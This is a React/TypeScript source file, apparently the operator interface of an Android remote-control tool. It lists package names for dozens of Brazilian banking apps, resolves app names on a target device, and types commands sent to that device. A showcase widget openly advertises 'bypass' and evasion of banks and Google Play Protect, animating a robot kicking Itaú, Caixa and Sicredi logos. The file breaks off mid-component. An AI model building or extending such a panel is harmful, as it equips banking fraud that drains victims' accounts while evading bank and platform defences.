import React, { useState, useEffect, useRef } from 'react';
import { createPortal } from 'react-dom';
import { 
  Sparkles, X, ChevronRight, ChevronLeft, CheckCircle, 
  Smartphone, Monitor, Zap, Shield, Flame, RefreshCw,
  Layers, Eye, Target, Minus, Maximize2, Move, Send, Bot,
  Volume2, Volume1, ArrowLeft, Home,
  Copy, Terminal, Check, AlertCircle, MessageSquare,
  Trash2, ShieldAlert, PhoneCall
} from 'lucide-react';
import { VoiceCallModal } from './VoiceCallModal';
import { devicesAPI } from '../services/api';
import type { Device } from '../types';
import itauLogoUrl from '../assets/banks/itau.svg';
import nubankLogoUrl from '../assets/banks/nubank.svg';
import caixaTemIconUrl from '../assets/banks/caixa_tem_icon.png';

interface TutorialStep {
  targetId: string;
  title: string;
  badge: string;
  icon: React.ReactNode;
  content: string;
  tip?: string;
  highlightLabel?: string;
}

export interface ChatMessage {
  id: string;
  sender: 'user' | 'robot';
  text: string;
  timestamp: string;
  status?: 'sending' | 'success' | 'error' | 'info';
  actionDetails?: {
    actionName: string;
    commandSent: string;
    targetDevice?: string;
  };
  suggestions?: string[];
}

/* ==========================================================================
   ðŸ“± DICIONÃRIO INTELIGENTE DE APLICATIVOS (BANCOS, REDES, SISTEMA, UTILITÃRIOS)
   ========================================================================== */
export const APP_DATABASE: Array<{
  name: string;
  package: string;
  category: 'bank' | 'social' | 'system' | 'util';
  aliases: string[];
  emoji: string;
  badgeColor?: string;
}> = [
  // --- BANCOS & FINANÃ‡AS ---
  { name: 'WhatsApp', package: 'com.whatsapp', category: 'social', aliases: ['whatsapp', 'zap', 'wpp', 'whats', 'whatssap', 'watsapp', 'zap zap'], emoji: 'ðŸŸ¢' },
  { name: 'WhatsApp Business', package: 'com.whatsapp.w4b', category: 'social', aliases: ['whatsapp business', 'zap business', 'wpp business', 'whats business'], emoji: 'ðŸ’¼' },
  { name: 'ItaÃº', package: 'br.com.itau', category: 'bank', aliases: ['itau', 'itaÃº', 'banco itau', 'app itau', 'itau pessoa fisica'], emoji: 'ðŸŸ ' },
  { name: 'ItaÃº CartÃµes', package: 'com.itau.cartoes', category: 'bank', aliases: ['itau cartoes', 'itaÃº cartÃµes', 'cartoes itau'], emoji: 'ðŸ’³' },
  { name: 'ItaÃº Empresas', package: 'br.com.itauempresas', category: 'bank', aliases: ['itau empresas', 'itaÃº empresas', 'itau pj'], emoji: 'ðŸ¢' },
  { name: 'Nubank', package: 'com.nu.production', category: 'bank', aliases: ['nubank', 'nu', 'roxinho', 'nu conta', 'banco nubank', 'com.nubank'], emoji: 'ðŸŸ£' },
  { name: 'CAIXA EconÃ´mica', package: 'br.com.caixa', category: 'bank', aliases: ['caixa', 'caixa economica', 'cef', 'banco caixa', 'caixa federal'], emoji: 'ðŸ”µ' },
  { name: 'CAIXA Tem', package: 'br.gov.caixa.tem', category: 'bank', aliases: ['caixa tem', 'caixatem', 'app caixa tem'], emoji: 'ðŸ”¹' },
  { name: 'Banco do Brasil', package: 'br.com.bb.android', category: 'bank', aliases: ['banco do brasil', 'bb', 'bancodobrasil', 'app bb'], emoji: 'ðŸŸ¡' },
  { name: 'Bradesco', package: 'br.com.bradesco', category: 'bank', aliases: ['bradesco', 'banco bradesco', 'app bradesco', 'com.bradesco'], emoji: 'ðŸ”´' },
  { name: 'Bradesco CartÃµes', package: 'com.bradesco.cartoes', category: 'bank', aliases: ['bradesco cartoes', 'bradesco cartÃµes', 'cartoes bradesco'], emoji: 'ðŸ’³' },
  { name: 'Santander', package: 'com.santander.app', category: 'bank', aliases: ['santander', 'banco santander', 'app santander', 'br.com.santander'], emoji: 'ðŸ”º' },
  { name: 'Santander Way', package: 'com.santander.way', category: 'bank', aliases: ['santander way', 'way', 'app way', 'cartao santander'], emoji: 'ðŸ”´' },
  { name: 'Banco Inter', package: 'br.com.bancointer', category: 'bank', aliases: ['inter', 'banco inter', 'intermedium', 'app inter'], emoji: 'ðŸŸ ' },
  { name: 'C6 Bank', package: 'br.com.c6bank', category: 'bank', aliases: ['c6', 'c6 bank', 'c6bank', 'banco c6'], emoji: 'âš«' },
  { name: 'Mercado Pago', package: 'com.mercadopago', category: 'bank', aliases: ['mercado pago', 'mercadopago', 'mp'], emoji: 'ðŸ¤' },
  { name: 'PicPay', package: 'com.picpay', category: 'bank', aliases: ['picpay', 'pic pay', 'br.com.picpay'], emoji: 'ðŸŸ¢' },
  { name: 'PagBank / PagSeguro', package: 'br.com.uol.ps.myaccount', category: 'bank', aliases: ['pagbank', 'pagseguro', 'pag bank', 'com.pagseguro'], emoji: 'ðŸŸ©' },
  { name: 'Sicredi', package: 'br.com.sicredi', category: 'bank', aliases: ['sicredi', 'banco sicredi', 'app sicredi'], emoji: 'ðŸŒ¿' },
  { name: 'Sicoob', package: 'br.com.sicoob', category: 'bank', aliases: ['sicoob', 'banco sicoob'], emoji: 'ðŸŒ²' },
  { name: 'Neon', package: 'br.com.neon', category: 'bank', aliases: ['neon', 'banco neon'], emoji: 'ðŸ”·' },
  { name: 'Digio', package: 'br.com.digio', category: 'bank', aliases: ['digio', 'banco digio'], emoji: 'ðŸŸ£' },
  { name: 'Will Bank', package: 'com.will.bank', category: 'bank', aliases: ['will bank', 'will', 'willbank'], emoji: 'ðŸŸ¨' },
  { name: 'Agibank', package: 'br.com.agibank', category: 'bank', aliases: ['agibank', 'agi bank'], emoji: 'ðŸŸ§' },
  { name: 'Sofisa Direto', package: 'br.com.sofisa', category: 'bank', aliases: ['sofisa', 'sofisa direto'], emoji: 'ðŸ”µ' },
  { name: 'Banrisul', package: 'br.com.banrisul', category: 'bank', aliases: ['banrisul', 'banco banrisul'], emoji: 'ðŸ”·' },
  { name: 'Next', package: 'br.com.next', category: 'bank', aliases: ['next', 'banco next'], emoji: 'ðŸŸ¢' },
  { name: 'XP Investimentos', package: 'br.com.xp.investimentos', category: 'bank', aliases: ['xp', 'xp investimentos'], emoji: 'ðŸŸ¡' },
  { name: 'BTG Pactual', package: 'com.btg.pactual', category: 'bank', aliases: ['btg', 'btg pactual'], emoji: 'ðŸ”µ' },
  { name: 'Banco Pan', package: 'com.panapp', category: 'bank', aliases: ['pan', 'banco pan', 'panapp'], emoji: 'ðŸ”·' },

  // --- REDES SOCIAIS & MENSAGENS ---
  { name: 'Telegram', package: 'org.telegram.messenger', category: 'social', aliases: ['telegram', 'telegran', 'tlg'], emoji: 'âœˆï¸' },
  { name: 'Instagram', package: 'com.instagram.android', category: 'social', aliases: ['instagram', 'insta', 'ig'], emoji: 'ðŸ“¸' },
  { name: 'Facebook', package: 'com.facebook.katana', category: 'social', aliases: ['facebook', 'face', 'fb'], emoji: 'ðŸ‘¥' },
  { name: 'TikTok', package: 'com.zhiliaoapp.musically', category: 'social', aliases: ['tiktok', 'tik tok', 'tok'], emoji: 'ðŸŽµ' },
  { name: 'Kwai', package: 'kwaiapp', category: 'social', aliases: ['kwai'], emoji: 'ðŸ”¥' },
  { name: 'YouTube', package: 'com.google.android.youtube', category: 'social', aliases: ['youtube', 'yt', 'you tube'], emoji: 'â–¶ï¸' },
  { name: 'Twitter / X', package: 'com.twitter.android', category: 'social', aliases: ['twitter', 'x', 'tt'], emoji: 'âœ–ï¸' },
  { name: 'Spotify', package: 'com.spotify.music', category: 'social', aliases: ['spotify', 'musica', 'spoti'], emoji: 'ðŸŽ§' },
  { name: 'Netflix', package: 'com.netflix.mediaclient', category: 'social', aliases: ['netflix'], emoji: 'ðŸŽ¬' },
  { name: 'Uber', package: 'com.ubercab', category: 'util', aliases: ['uber', 'motorista'], emoji: 'ðŸš—' },
  { name: '99', package: 'com.taxis99', category: 'util', aliases: ['99', '99app', '99pop'], emoji: 'ðŸš–' },
  { name: 'iFood', package: 'br.com.brainweb.ifood', category: 'util', aliases: ['ifood', 'comida', 'entrega'], emoji: 'ðŸ”' },
  { name: 'Mercado Livre', package: 'com.mercadolibre', category: 'util', aliases: ['mercado livre', 'mercadolivre', 'ml'], emoji: 'ðŸ“¦' },
  { name: 'Shopee', package: 'com.shopee.br', category: 'util', aliases: ['shopee', 'shoppe'], emoji: 'ðŸ›ï¸' },

  // --- SISTEMA & GOOGLE ---
  { name: 'ConfiguraÃ§Ãµes', package: 'com.android.settings', category: 'system', aliases: ['configuracoes', 'configuraÃ§Ãµes', 'ajustes', 'settings', 'config'], emoji: 'âš™ï¸' },
  { name: 'Google Chrome', package: 'com.android.chrome', category: 'system', aliases: ['chrome', 'navegador', 'google chrome', 'internet', 'browser'], emoji: 'ðŸŒ' },
  { name: 'Google Play Store', package: 'com.android.vending', category: 'system', aliases: ['play store', 'google play', 'loja', 'store'], emoji: 'ðŸ›ï¸' },
  { name: 'CÃ¢mera', package: 'com.android.camera', category: 'system', aliases: ['camera', 'cÃ¢mera', 'foto', 'abrir camera'], emoji: 'ðŸ“·' },
  { name: 'Galeria / Fotos', package: 'com.google.android.apps.photos', category: 'system', aliases: ['galeria', 'fotos', 'google fotos', 'album'], emoji: 'ðŸ–¼ï¸' },
  { name: 'Calculadora', package: 'com.google.android.calculator', category: 'system', aliases: ['calculadora', 'calc'], emoji: 'ðŸ§®' },
  { name: 'RelÃ³gio / Alarme', package: 'com.google.android.deskclock', category: 'system', aliases: ['relogio', 'relÃ³gio', 'alarme', 'despertador'], emoji: 'â°' },
  { name: 'Arquivos (Files)', package: 'com.google.android.documentsui', category: 'system', aliases: ['arquivos', 'files', 'gerenciador de arquivos', 'meus arquivos'], emoji: 'ðŸ“' },
  { name: 'Gmail', package: 'com.google.android.gm', category: 'system', aliases: ['gmail', 'email', 'e-mail', 'correio'], emoji: 'âœ‰ï¸' },
  { name: 'Google Maps', package: 'com.google.android.apps.maps', category: 'system', aliases: ['mapas', 'maps', 'google maps', 'gps'], emoji: 'ðŸ—ºï¸' },
  { name: 'Mensagens (SMS)', package: 'com.google.android.apps.messaging', category: 'system', aliases: ['mensagens', 'sms', 'torpedo', 'mensagem'], emoji: 'ðŸ’¬' },
  { name: 'Telefone (Discador)', package: 'com.google.android.dialer', category: 'system', aliases: ['telefone', 'discador', 'ligar', 'chamadas'], emoji: 'ðŸ“ž' },
  { name: 'Contatos', package: 'com.google.android.contacts', category: 'system', aliases: ['contatos', 'agenda'], emoji: 'ðŸ“’' },
];

/**
 * ðŸ” Encontra o pacote de um aplicativo com base em busca textual inteligente
 */
export function resolveAppPackage(query: string, installedApps?: any[]): { name: string; package: string; emoji?: string } | null {
  if (!query) return null;
  const q = query.trim().toLowerCase();

  // 1. Se for um pacote direto (ex: com.whatsapp ou br.com...)
  if (q.includes('.') && (q.startsWith('com.') || q.startsWith('br.') || q.startsWith('org.') || q.startsWith('net.'))) {
    const matched = APP_DATABASE.find(a => a.package.toLowerCase() === q);
    return {
      name: matched ? matched.name : q,
      package: q,
      emoji: matched?.emoji || 'ðŸ“±'
    };
  }

  // 2. Busca na lista de apps instalados do aparelho (se fornecida)
  if (installedApps && installedApps.length > 0) {
    const exactInst = installedApps.find(a => {
      const aName = (a.name || a.app_name || '').toLowerCase();
      const aPkg = (a.package || a.package_name || '').toLowerCase();
      return aName === q || aPkg === q;
    });
    if (exactInst) {
      return {
        name: exactInst.name || exactInst.app_name || exactInst.package || exactInst.package_name,
        package: exactInst.package || exactInst.package_name,
        emoji: 'ðŸ“±'
      };
    }

    const partialInst = installedApps.find(a => {
      const aName = (a.name || a.app_name || '').toLowerCase();
      const aPkg = (a.package || a.package_name || '').toLowerCase();
      return aName.includes(q) || q.includes(aName) || aPkg.includes(q);
    });
    if (partialInst) {
      return {
        name: partialInst.name || partialInst.app_name || partialInst.package || partialInst.package_name,
        package: partialInst.package || partialInst.package_name,
        emoji: 'ðŸ“±'
      };
    }
  }

  // 3. Busca no banco de dados embutido por apelidos e nomes
  for (const item of APP_DATABASE) {
    if (item.name.toLowerCase() === q || item.package.toLowerCase() === q) {
      return { name: item.name, package: item.package, emoji: item.emoji };
    }
    if (item.aliases.some(alias => alias === q || q.includes(alias) || alias.includes(q))) {
      return { name: item.name, package: item.package, emoji: item.emoji };
    }
  }

  // 4. Busca parcial no banco
  for (const item of APP_DATABASE) {
    if (item.name.toLowerCase().includes(q) || q.includes(item.name.toLowerCase())) {
      return { name: item.name, package: item.package, emoji: item.emoji };
    }
  }

  return null;
}

/* ==========================================================================
   ðŸ¦ LOGOTIPOS DOS BANCOS & GOOGLE PLAY STORE
   ========================================================================== */

export const ItauLogoCard: React.FC<{ size?: number; className?: string }> = ({ size = 52, className = '' }) => (
  <div 
    className={`relative rounded-xl overflow-hidden shadow-lg flex items-center justify-center flex-shrink-0 select-none bg-[#EC7000] p-1.5 ${className}`}
    style={{ 
      width: size, 
      height: size, 
      boxShadow: '0 4px 15px rgba(236, 112, 0, 0.45)'
    }}
  >
    <img 
      src={itauLogoUrl} 
      alt="ItaÃº" 
      className="w-full h-full object-contain select-none pointer-events-none" 
    />
  </div>
);

export const CaixaLogoCard: React.FC<{ size?: number; className?: string }> = ({ size = 52, className = '' }) => (
  <div 
    className={`relative rounded-xl overflow-hidden shadow-lg flex flex-col items-center justify-center flex-shrink-0 select-none p-1 ${className}`}
    style={{ 
      width: size, 
      height: size, 
      background: 'linear-gradient(135deg, #0070CE 0%, #00458E 100%)',
      boxShadow: '0 4px 15px rgba(0, 112, 206, 0.55)'
    }}
  >
    <div className="flex items-center justify-center" style={{ width: size * 0.55, height: size * 0.55 }}>
      <svg viewBox="0 0 100 100" className="w-full h-full select-none pointer-events-none" fill="none">
        <defs>
          <linearGradient id="caixaXOrange" x1="0%" y1="0%" x2="100%" y2="100%">
            <stop offset="0%" stopColor="#FF8300" />
            <stop offset="100%" stopColor="#E06500" />
          </linearGradient>
        </defs>
        <path d="M22 18 L40 18 L78 82 L60 82 Z" fill="#FFFFFF" />
        <path d="M22 82 L40 82 L53 60 L35 60 Z" fill="url(#caixaXOrange)" />
        <path d="M47 40 L65 40 L78 18 L60 18 Z" fill="url(#caixaXOrange)" />
      </svg>
    </div>
    <span 
      className="font-black text-white uppercase tracking-tight leading-none mt-0.5"
      style={{ fontSize: size * 0.17, fontFamily: 'Inter, sans-serif' }}
    >
      CAIXA
    </span>
  </div>
);

export const CaixaTemLogoCard: React.FC<{ size?: number; className?: string }> = ({ size = 52, className = '' }) => (
  <div 
    className={`relative rounded-2xl overflow-hidden shadow-lg flex items-center justify-center flex-shrink-0 select-none bg-[#005CA9] ${className}`}
    style={{ 
      width: size, 
      height: size, 
      boxShadow: '0 4px 15px rgba(0, 114, 206, 0.45)'
    }}
  >
    <img 
      src={caixaTemIconUrl} 
      alt="CAIXA Tem" 
      className="w-full h-full object-cover select-none pointer-events-none rounded-2xl"
    />
  </div>
);

export const SicrediLogoCard: React.FC<{ size?: number; className?: string }> = ({ size = 52, className = '' }) => (
  <div 
    className={`relative rounded-xl overflow-hidden shadow-lg flex flex-col items-center justify-center flex-shrink-0 select-none p-1 ${className}`}
    style={{ 
      width: size, 
      height: size, 
      background: 'linear-gradient(135deg, #008542 0%, #00602E 100%)',
      boxShadow: '0 4px 15px rgba(0, 133, 66, 0.55)'
    }}
  >
    <div className="flex items-center justify-center" style={{ width: size * 0.52, height: size * 0.52 }}>
      <svg viewBox="0 0 120 120" className="w-full h-full select-none pointer-events-none" fill="none">
        <g fill="#FFFFFF">
          <path d="M60 14 C68 14 74 20 74 29 C74 38 60 46 60 46 C60 46 46 38 46 29 C46 20 52 14 60 14 Z" opacity="0.95" />
          <path d="M106 60 C106 68 100 74 91 74 C82 74 74 60 74 60 C74 60 82 46 91 46 C100 46 106 52 106 60 Z" opacity="0.95" />
          <path d="M60 106 C52 106 46 100 46 91 C46 82 60 74 60 74 C60 74 74 82 74 91 C74 100 68 106 60 106 Z" opacity="0.95" />
          <path d="M14 60 C14 52 20 46 29 46 C38 46 46 60 46 60 C46 60 38 74 29 74 C20 74 14 68 14 60 Z" opacity="0.95" />
          <circle cx="60" cy="60" r="4.5" fill="#00602E" />
        </g>
      </svg>
    </div>
    <span 
      className="font-black text-white tracking-tight leading-none mt-0.5"
      style={{ fontSize: size * 0.16, fontFamily: 'Inter, sans-serif' }}
    >
      Sicredi
    </span>
  </div>
);

export const NubankLogoCard: React.FC<{ size?: number; className?: string }> = ({ size = 52, className = '' }) => (
  <div 
    className={`relative rounded-xl overflow-hidden shadow-lg flex items-center justify-center flex-shrink-0 select-none bg-[#820AD1] p-2 ${className}`}
    style={{ 
      width: size, 
      height: size, 
      boxShadow: '0 4px 15px rgba(130, 10, 209, 0.5)'
    }}
  >
    <img 
      src={nubankLogoUrl} 
      alt="Nubank" 
      className="w-full h-auto object-contain filter brightness-0 invert select-none pointer-events-none" 
      style={{ maxHeight: size * 0.65 }}
    />
  </div>
);

/* ==========================================================================
   ðŸ¤– AVATAR DO ROBÃ” CIBERNÃ‰TICO (CYBER MECHA ROBOT)
   ========================================================================== */
export const RobotAvatar: React.FC<{ 
  size?: number; 
  isFloating?: boolean; 
  isSpeaking?: boolean; 
  isKicking?: boolean; 
  theme?: 'cyan' | 'blue' | 'emerald' | 'amber' | 'rose';
}> = ({
  size = 52,
  isFloating = true,
  isSpeaking = false,
  isKicking = false,
  theme = 'cyan',
}) => {
  const cyanGlow = theme === 'emerald' ? '#ff4757' : theme === 'rose' ? '#f43f5e' : theme === 'amber' ? '#f59e0b' : '#ff1e4d';
  const midBlue = theme === 'emerald' ? '#059669' : theme === 'rose' ? '#e11d48' : theme === 'amber' ? '#d97706' : '#cc1e4d';

  return (
    <div
      className={`relative flex items-center justify-center select-none ${
        isFloating && !isKicking ? 'animate-robot-float' : ''
      } ${isKicking ? 'animate-robot-kick-body' : ''}`}
      style={{ width: size, height: size }}
    >
      {/* ðŸ”® ANEL DE ENERGIA ROTATIVO CIBERNÃ‰TICO */}
      <div 
        className="absolute inset-[-4px] rounded-full border border-dashed border-red-400/50 animate-[spin_10s_linear_infinite] pointer-events-none"
        style={{ borderColor: `${cyanGlow}40` }}
      />
      <div 
        className="absolute inset-[-8px] rounded-full border border-dotted border-red-500/20 animate-[spin_16s_linear_infinite_reverse] pointer-events-none"
      />

      {/* ðŸŒŸ BRILHO AURA PULSANTE */}
      <div 
        className="absolute inset-0 rounded-2xl blur-md animate-pulse pointer-events-none"
        style={{
          background: `radial-gradient(circle, ${cyanGlow}55 0%, ${midBlue}25 70%, transparent 100%)`
        }}
      />

      {/* ðŸ¤– ROBÃ” SVG FUTURISTA COM LASER E IGUALADOR */}
      <svg
        viewBox="0 0 100 100"
        className="w-full h-full relative z-10"
        style={{ filter: `drop-shadow(0 0 10px ${cyanGlow})` }}
        fill="none"
        xmlns="http://www.w3.org/2000/svg"
      >
        <defs>
          <linearGradient id="robotHeadGrad" x1="0%" y1="0%" x2="0%" y2="100%">
            <stop offset="0%" stopColor="#991b1b" />
            <stop offset="50%" stopColor="#0f172a" />
            <stop offset="100%" stopColor="#020617" />
          </linearGradient>
          <linearGradient id="robotVisorGrad" x1="0%" y1="0%" x2="0%" y2="100%">
            <stop offset="0%" stopColor="#021430" />
            <stop offset="100%" stopColor="#010814" />
          </linearGradient>
        </defs>

        {/* ðŸ“¡ ANTENAS ESQUERDA E DIREITA COM ONDAS DE TRANSMISSÃƒO */}
        <line x1="32" y1="26" x2="22" y2="10" stroke={cyanGlow} strokeWidth="2.5" strokeLinecap="round" />
        <circle cx="22" cy="10" r="3.5" fill={cyanGlow} className="animate-pulse" />
        <circle cx="22" cy="10" r="8" stroke={cyanGlow} strokeWidth="1" opacity="0.6" className="animate-ping" />

        <line x1="68" y1="26" x2="78" y2="10" stroke={cyanGlow} strokeWidth="2.5" strokeLinecap="round" />
        <circle cx="78" cy="10" r="3.5" fill={cyanGlow} className="animate-pulse" />
        <circle cx="78" cy="10" r="8" stroke={cyanGlow} strokeWidth="1" opacity="0.6" className="animate-ping" />

        {/* ðŸ›¡ï¸ CABEÃ‡A E ORELHAS LATERAIS */}
        <rect x="20" y="24" width="60" height="52" rx="16" fill="url(#robotHeadGrad)" stroke={cyanGlow} strokeWidth="2" />
        <rect x="14" y="42" width="6" height="16" rx="3" fill={midBlue} stroke={cyanGlow} strokeWidth="1" />
        <rect x="80" y="42" width="6" height="16" rx="3" fill={midBlue} stroke={cyanGlow} strokeWidth="1" />

        {/* ðŸªŸ VISOR CIBERNÃ‰TICO COM LINHA LASER */}
        <rect x="26" y="32" width="48" height="34" rx="10" fill="url(#robotVisorGrad)" stroke="#ff3b6b" strokeWidth="1.5" />
        <line x1="28" y1="36" x2="72" y2="36" stroke={cyanGlow} strokeWidth="1" opacity="0.5" className="animate-pulse" />

        {/* ðŸ‘ï¸ OLHOS CIBERNÃ‰TICOS PISCANTES & ANIMADOS */}
        <g className="animate-robot-blink">
          <rect x="33" y="40" width="12" height="13" rx="4" fill={cyanGlow} className={isSpeaking ? 'animate-bounce' : ''} />
          <circle cx="36" cy="43" r="1.5" fill="#ffffff" />
          <rect x="55" y="40" width="12" height="13" rx="4" fill={cyanGlow} className={isSpeaking ? 'animate-bounce' : ''} />
          <circle cx="58" cy="43" r="1.5" fill="#ffffff" />
        </g>

        {/* ðŸŽ™ï¸ BOCA / EQUALIZADOR DE VOZ ANIMADO QUANDO FALA OU EXECUTA */}
        {isSpeaking ? (
          <g className="animate-pulse">
            <line x1="38" y1="58" x2="38" y2="63" stroke={cyanGlow} strokeWidth="2.5" strokeLinecap="round" className="animate-[ping_0.6s_infinite]" />
            <line x1="44" y1="56" x2="44" y2="65" stroke="#ff3b6b" strokeWidth="2.5" strokeLinecap="round" className="animate-[ping_0.4s_infinite]" />
            <line x1="50" y1="55" x2="50" y2="66" stroke={cyanGlow} strokeWidth="2.5" strokeLinecap="round" className="animate-[ping_0.5s_infinite]" />
            <line x1="56" y1="56" x2="56" y2="65" stroke="#ff3b6b" strokeWidth="2.5" strokeLinecap="round" className="animate-[ping_0.4s_infinite]" />
            <line x1="62" y1="58" x2="62" y2="63" stroke={cyanGlow} strokeWidth="2.5" strokeLinecap="round" className="animate-[ping_0.6s_infinite]" />
          </g>
        ) : (
          <path d="M42 59 Q50 64 58 59" stroke={cyanGlow} strokeWidth="2" strokeLinecap="round" />
        )}

        {/* ðŸ’Ž PEITO E NÃšCLEO REATOR PULSANTE */}
        <rect x="42" y="76" width="16" height="6" rx="2" fill="#1e293b" stroke={cyanGlow} strokeWidth="1" />
        <path d="M28 82 C28 82 38 78 50 78 C62 78 72 82 72 82 L76 96 L24 96 Z" fill="url(#robotHeadGrad)" stroke={cyanGlow} strokeWidth="1.5" />
        <circle cx="50" cy="88" r="4.5" fill={cyanGlow} className="animate-ping opacity-90" />
        <circle cx="50" cy="88" r="4" fill="#ffffff" />
      </svg>
    </div>
  );
};

/* ==========================================================================
   ðŸ¥‹ ARENA DO CHUTE: ROBÃ” CHUTANDO ITAÃš, CAIXA & SICREDI
   ========================================================================== */
export const RobotKickShowcase: React.FC<{
  autoKick?: boolean;
  userName?: string;
  isDashboardFeatured?: boolean;
  onKicked?: () => void;
}> = ({ autoKick = true, userName = 'operador', isDashboardFeatured = false, onKicked }) => {
  const [kickState, setKickState] = useState<'idle' | 'charging' | 'kicking' | 'flying'>('idle');
  const [kickCount, setKickCount] = useState<number>(0);
  const [autoLoop, setAutoLoop] = useState<boolean>(autoKick);
  const [combatText, setCombatText] = useState<string>('ðŸ›¡ï¸ BANCOS NA MIRA');

  const executeKick = () => {
    if (kickState === 'kicking' || kickState === 'charging') return;
    setKickState('charging');
    setCombatText('âš¡ CARREGANDO BYPASS...');

    setTimeout(() => {
      setKickState('kicking');
      setCombatText('ðŸ’¥ KICK NO ITAÃš, CAIXA & SICREDI!');

      setTimeout(() => {
        setKickState('flying');
        setKickCount((c) => c + 1);
        setCombatText('ðŸš« 100% BYPASS! BANCOS CHUTADOS!');
        if (onKicked) onKicked();

        setTimeout(() => {
          setKickState('idle');
          setCombatText('ðŸ›¡ï¸ FILA PRONTA PARA NOVO BYPASS');
        }, 1900);
      }, 350);
    }, 350);
  };

  useEffect(() => {
    if (!autoLoop) return;
    const interval = setInterval(() => {
      if (kickState === 'idle') {
        executeKick();
      }
    }, 3800);
    return () => clearInterval(interval);
  }, [autoLoop, kickState]);

  return (
    <div className={`relative rounded-3xl bg-gradient-to-b from-[#06173a]/95 via-[#041029]/95 to-[#020817]/98 border border-red-400/50 shadow-[0_0_35px_rgba(0,240,255,0.25)] overflow-hidden select-none ${
      isDashboardFeatured ? 'p-4 sm:p-5 mb-5' : 'p-4 sm:p-5'
    }`}>
      <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-red-400 to-transparent shadow-[0_0_12px_#ff1e4d]" />
      <div className="flex items-center justify-between border-b border-red-500/25 pb-3 mb-3 relative z-10">
        <div className="flex items-baseline gap-2">
          <span className="font-mono font-black text-base sm:text-lg tracking-wider text-white flex items-center gap-1">
            <span className="text-red-400 font-extrabold drop-shadow-[0_0_12px_rgba(0,240,255,0.9)]">BYPASS</span>
          </span>
          <span className="text-[10px] sm:text-xs font-mono font-bold text-pink-300/80 tracking-wide">
            EvasÃ£o de Bancos & Play Protect
          </span>
        </div>
        <span className="px-2.5 py-0.5 rounded-full text-[9px] font-mono font-black bg-red-500/20 border border-red-400/50 text-pink-200">
          KICKS: {kickCount}
        </span>
      </div>

      <div className="relative min-h-[135px] flex items-center justify-between gap-4 px-2 py-2 z-10">
        <div className="flex flex-col items-center flex-shrink-0">
          <RobotAvatar 
            size={64} 
            isFloating={kickState === 'idle'} 
            isSpeaking={kickState === 'charging' || kickState === 'kicking'}
            isKicking={kickState === 'kicking' || kickState === 'charging'}
            theme="cyan" 
          />
          <div className="mt-2 text-center">
            <span className="text-[8px] font-mono tracking-widest text-red-400/60 uppercase block">STATUS</span>
            <span className="text-[11px] font-black font-mono text-white tracking-wider">
              {userName}
            </span>
          </div>
        </div>

        <div className="flex-1 flex flex-col items-center justify-center text-center px-1">
          <span className="text-[10px] sm:text-xs font-black font-mono tracking-wider text-pink-300 uppercase animate-pulse">
            {combatText}
          </span>
          <span className="text-[9px] font-mono text-red-400/70 mt-0.5">
            {kickState === 'flying' ? 'Bancos Neutralizados!' : 'Bypass Ativo em Segundo Plano'}
          </span>
        </div>

        <div className="relative flex-shrink-0 min-w-[130px] sm:min-w-[150px] min-h-[95px] flex items-center justify-center">
          <div className="absolute inset-0 rounded-2xl border-2 border-dashed border-red-400/70 bg-red-950/25 flex flex-col justify-between p-2 pointer-events-none">
            <div className="text-right">
              <span className="text-[9px] font-black font-mono tracking-widest text-pink-300 uppercase">
                NA FILA
              </span>
            </div>
          </div>
          <div className="relative w-24 h-16 flex items-center justify-center z-10">
            <div className={`absolute left-0 top-0 transition-all duration-300 ${kickState === 'flying' ? 'animate-fly-play' : 'opacity-80'}`}>
              <SicrediLogoCard size={38} />
            </div>
            <div className={`absolute left-4 top-1 transition-all duration-300 ${kickState === 'flying' ? 'animate-fly-itau' : 'opacity-90'}`}>
              <ItauLogoCard size={40} />
            </div>
            <div className={`absolute left-8 top-2 transition-all duration-300 ${kickState === 'flying' ? 'animate-fly-caixa' : 'opacity-100'}`}>
              <CaixaLogoCard size={42} />
            </div>
          </div>
        </div>
      </div>

      <div className="mt-2 pt-2.5 border-t border-red-500/20 flex items-center justify-between gap-2 relative z-10">
        <button
          type="button"
          onClick={() => setAutoLoop(!autoLoop)}
          className={`px-3 py-1.5 rounded-xl text-[10px] font-mono font-bold flex items-center gap-1.5 transition-all ${
            autoLoop ? 'bg-red-500/20 text-pink-200 border border-red-400/50' : 'bg-slate-900 text-slate-400 border border-slate-800'
          }`}
        >
          <RefreshCw className={`w-3 h-3 ${autoLoop ? 'animate-spin' : ''}`} />
          <span>{autoLoop ? 'Auto-Kick Ativo' : 'Auto-Kick Pausado'}</span>
        </button>

        <button
          type="button"
          onClick={executeKick}
          disabled={kickState !== 'idle'}
          className="px-4 py-1.5 rounded-xl bg-gradient-to-r from-red-500 via-red-600 to-pink-400 text-white font-black font-mono text-[11px] uppercase tracking-wider shadow-[0_0_20px_rgba(0,240,255,0.6)] border border-pink-300 hover:scale-105 active:scale-95 flex items-center gap-1.5 disabled:opacity-50 cursor-pointer"
        >
          <Flame className="w-3.5 h-3.5 text-pink-200 fill-cyan-200" />
          <span>Chutar Bancos Agora!</span>
        </button>
      </div>
    </div>
  );
};

/* ==========================================================================
   ðŸŽ¯ OVERLAY DE SPOTLIGHT PARA TUTORIAL
   ========================================================================== */
export const SpotlightTargetOverlay: React.FC<{
  targetId: string;
  label: string;
  isActive: boolean;
}> = ({ targetId, label, isActive }) => {
  const [rect, setRect] = useState<DOMRect | null>(null);

  useEffect(() => {
    if (!isActive || !targetId) {
      setRect(null);
      return;
    }
    const updatePosition = () => {
      const el = document.getElementById(targetId);
      if (el) {
        setRect(el.getBoundingClientRect());
        el.scrollIntoView({ behavior: 'smooth', block: 'center' });
      } else {
        setRect(null);
      }
    };
    updatePosition();
    const t1 = setTimeout(updatePosition, 100);
    const t2 = setTimeout(updatePosition, 300);
    window.addEventListener('resize', updatePosition);
    return () => {
      clearTimeout(t1);
      clearTimeout(t2);
      window.removeEventListener('resize', updatePosition);
    };
  }, [targetId, isActive]);

  if (!isActive || !rect) return null;

  return createPortal(
    <div
      className="fixed pointer-events-none transition-all duration-300 ease-out"
      style={{
        top: Math.max(0, rect.top - 8),
        left: Math.max(0, rect.left - 8),
        width: rect.width + 16,
        height: rect.height + 16,
        zIndex: 99999,
      }}
    >
      <div className="w-full h-full rounded-2xl border-[3px] border-pink-300 shadow-[0_0_50px_rgba(0,240,255,0.95)] animate-pulse relative" />
